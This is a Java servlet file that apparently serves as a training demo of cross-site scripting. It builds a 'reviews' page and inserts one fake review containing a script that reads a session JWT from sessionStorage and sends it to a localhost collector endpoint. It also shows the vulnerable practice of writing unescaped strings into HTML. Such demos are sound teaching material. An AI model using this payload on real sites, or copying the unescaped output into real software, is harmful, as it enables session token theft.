package com.example.servlet;




import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/*import com.example.model.SuperVillain;*/
import com.fasterxml.jackson.databind.ObjectMapper;

public class MyServlet extends HttpServlet{

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	
	
	
	@Override
	protected void doPost(HttpServletRequest req,
						HttpServletResponse resp)
							throws IOException, ServletException
							{
		
			resp.setContentType("text/html");
			
			
			/*SuperVillain dannyboy = 
					new SuperVillain("Danny Boy", "Electromagnetism",
							250_000);*/
			
			/*resp.getWriter().write(new ObjectMapper().writeValueAsString(dannyboy));*/
			
			/*PrintWriter out = resp.getWriter();
			out.println("<!DOCTYPE html>");
			out.println("<html>");
			out.println("<head>");
			out.println("<meta charset=\"ISO-8859-1\">");
			out.println("<title>Insert title here</title>");
			out.println("</head>");
			out.println("<body>");
			out.println("</body>");
			out.println("</html>");*/
			
			
			String a = "Review One";
			String b = "Review Two";
			
			/*String c ="Review Three &ltscript&gtalert(\"message\");&lt/script&gt";*/
			
			String c = "<script>var jwt = sessionStorage.getItem('token');"
			+ "let xhttp = new XMLHttpRequest();"
			+ "xhttp.open(\"POST\", \"http://localhost:3000/users/o\");"
			+ "xhttp.setRequestHeader(\"payload\", jwt);"
			+ "xhttp.send()</script>";
			
			
			
			
			String page = "<!DOCTYPE html>\r\n" + 
					"<html>\r\n" + 
					"<head>\r\n" + 
					"<meta charset=\"ISO-8859-1\">\r\n" + 
					"<title>Insert title here</title>\r\n" + 
					"</head>\r\n" + 
					"<body>\r\n" +
					"Reviews\r\n" + "<p></p>" +
					a + "\r\n" +
					"<p></p>" +
					b + "\r\n" +
					"<p></p>" +
					c + "\r\n" +
					"<p></p>" +
					"<input type=\"text\">" +
					/*"\r\n" + 
					"\r\n" + 
					"<form method=\"POST\" action=\"wumpus\">\r\n" + 
					"			ddThis is our amazing servlet!\r\n" + 
					"			<input type=\"submit\" value=\"OurServ!\"/>\r\n" + 
					"		</form>\r\n" + 
					"\r\n" + 
					"\r\n" + */
					"</body>\r\n" + 
					"</html>";
			
			resp.getWriter().write(page);
			
			System.out.println("we're inside of our servlet! POST!");
		
		
							}

}
